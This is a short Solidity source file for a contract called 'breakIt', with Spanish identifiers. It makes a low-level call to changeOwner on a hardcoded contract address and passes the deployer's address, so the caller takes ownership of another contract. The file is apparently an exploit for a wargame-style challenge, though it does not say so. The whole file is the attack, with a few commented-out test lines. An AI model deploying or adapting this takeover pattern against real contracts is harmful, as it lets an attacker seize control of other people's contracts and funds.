pragma solidity ^0.4.18;

contract breakIt {
    address public dir_yo = msg.sender;
    address dir_contrato = 0xA73aDaF43C7BB432fF42C9D2929eB85ad6b758eb;
    address public dir_este_contracto = this;
    //dir_contrato.changeOwner(dir_yo);
    
    function changeOwner(address dire) {
        dir_contrato.call(bytes4(sha3("changeOwner(address)")), dire);
    }
    
    function activar() public {
        changeOwner(dir_yo);
    }
//    uint probador = 6;

    
//    function prueba() public returns (uint){
//        return probador;
//    }
}
